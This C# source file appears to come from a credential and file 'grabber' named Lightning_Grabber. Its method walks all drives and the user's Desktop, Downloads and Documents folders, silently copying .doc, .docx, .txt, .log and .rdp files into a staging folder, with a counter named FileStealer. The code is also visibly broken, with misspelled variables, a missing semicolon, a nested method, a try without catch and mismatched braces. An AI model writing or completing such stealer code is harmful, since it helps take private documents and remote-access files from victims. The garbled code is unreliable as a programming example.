using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Lightning_Grabber.Resources
{
    internal class WebData
    {
        public static void TakeFiles(string path)
        {
            try
            {
                Directory.CreateDirectory(path);
                List<string> list = new List<string>();
                DriveInfo[] drvies = DriveInfo.GetDrives();
                foreach (DriveInfo driveinfo in drives)
                {
                    list.Add(driveinfo.Name);

                }
                list.Add("C:\\Users\\" + Environment.UserName.ToString() + "\\Desktop");
                list.Add("C:\\Users\\" + Environment.UserName.ToString() + "\\Downloads");
                list.Add("C:\\Users\\" + Environment.UserName.ToString() + "\\Documents");
                foreach (string dir in list.ToArray())
                {
                    Files.TakeFiles(dir, path)
                }
                Counter.files = Files.files.ToString();
            }
            catch (Exception)
            {
            }
            // Get docs rdp txt and others

            private static void TakeFiles(string dir, string path)
            {
                try
                {
                    foreach (FileInfo fileinfo in new DirectoryInfo(dir).GetFiles())
                    {
                        bool flag = fileinfo.Extension.Equals(".doc") || fileinfo.Extension.Equals(".docx") || fileinfo.Extension.Equals
                            (".txt") || fileinfo.Extension.Equals(".log") || fileinfo.Extension.Equals(".rdp");
                        if (flag)
                        {
                            fileinfo.CopyTo(path + "\\" + fileinfo.Name);
                            FileStealer.files++;
                        }
                    }
                    foreach (DirectoryInfo directoryInfo in new DirectoryInfo(dir).GetDirectories())
                    {
                        foreach (FileInfo fileinfo2 in new DirectoryInfo(dir + "\\" + directoryInfo.ToString()).GetFiles())
                        {
                            bool flag2 = fileinfo2.Extension.Equals(".doc") || fileinfo2.Extension.Equals(".docx") ||
                                fileinfo2.Extension.Equals(".txt") || fileinfo2.Extension.Equals(".log") || fileinfo2.Extension.Equals
                                (".rdp");
                            if (flag2)
                            {
                                fileinfo2.CopyTo(path + "\\" + fileinfo2.Name);
                                Files.files++;
                            }
                        }
                    }
                }
                    }
                }
            }
        }
    }
}
